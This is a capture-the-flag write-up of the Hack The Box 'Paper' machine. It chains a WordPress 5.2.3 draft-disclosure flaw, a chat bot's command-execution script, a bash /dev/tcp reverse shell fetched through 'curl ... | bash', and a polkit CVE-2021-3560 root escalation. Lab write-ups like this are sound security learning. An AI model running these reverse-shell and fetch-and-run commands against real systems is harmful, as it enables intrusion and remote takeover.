# Paper

## System

IP Address: **10.10.11.143**

Hostname: **paper.htb**

OS: **********Linux**********

## Discovery

Nnap reveals three ports open:

```html
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
```

We know the flavor of linux is centos. It’s running Apache 2.4, which is fairly old. 

Browsing the HTTP page, we get a test page that is returned. Same for HTTPS. There’s a couple of interesting HTTP headers returned in the response:

```html
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
< X-Backend-Server: office.paper
```

I wonder if that version of `mod_fcgid` is vulnerable. First, I’m going to investigate `office.paper`. I added that to my local hosts file and browse to the root page which is a wordpress blog: “Blunder Tiffin, Inc - Paper Company”. There are a couple of blog posts all written by user `Prisonmike`. There’s a post saying 

> As of now there is only one user in this blog. Which is me! Just me.
> 

Followed by a comment by `nick`:

> Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
> 

Those are big hints. Curling that page we also get back the version of PHP running on the system (`7.2.24`) and WPScan reports a number of vulnerabilities and the version of Wordpress running (`5.2.3`). One of the vulnerabilities reported is eerily similar to the comment from nick about secrets in post drafts:

```html
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
```

WPScan details the vulnerability here ([https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)) with a PoC:

```html
http://office.paper/?static=1
```

Which returns some unformatted content:

```html
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

## User

Browsing over to the link so thoughtfully provided, we are able to register and login into a chat account. There’s a long thread in `#general` about a user installing a chat bot that can list and get files on the system. Interacting with that user allows us to interact with the system. It’s apparently running hubot and I listed all the scripts provided by this hubot instance. One of which is very encouraging:

```html
<!=====Contents of file ../hubot/scripts/cmd.coffee=====>
# Description:
# Runs a command on hubot
# TOTAL VIOLATION of any and all security!
#
# Commands:
# hubot cmd <command> - runs a command on hubot host

module.exports = (robot) ->
robot.respond /CMD (.*)$/i, (msg) ->
# console.log(msg)
@exec = require('child_process').exec
cmd = msg.match[1]
msg.send "Running [#{cmd}]..."

@exec cmd, (error, stdout, stderr) ->
if error
msg.send error
msg.send stderr
else
msg.send stdout
```

Sure enough, there’s a hidden `cmd` command that `recyclops` will accept. We can get a remote shell with

```html
# Local Setup
$ cat <<EOF >shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.109/1337 0>&1
EOF
$ python -m http.server 8000
$ nc -lvnp 1337

# Requests
recyclops cmd curl http://10.10.14.17:8000/shell.sh|bash
```

Now we have the user shell:

```html
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.143] 35364
[dwight@paper hubot]$ cd
[dwight@paper ~]$ cat user.txt	
cat user.txt
81864dba1963e9be78dd89ed083fc42d
```

## System

One thing that stood out from `dwight`'s home directory is the presence of some sort of window manager. I was just working through another box trying a `polkit` privilege escalation (**CVE-2021-3560)** and checked if it was vulnerable here. We could go exploiting it manually ([https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)) or use a script developed by secnigma ([https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh)). Running this on the machine confirms the system is vulnerable and we can exploit it by running the script until we are able to login:

```html
[dwight@paper ~]$ su - secnigma              
Password: 
[secnigma@paper ~]$ sudo su
[sudo] password for secnigma: 
[root@paper secnigma]# cd
[root@paper ~]# cat root.txt
a3852855e9aa149503d7d17f9438ab96
```

This one was by far the easiest I’ve encountered, but still fun nonetheless.
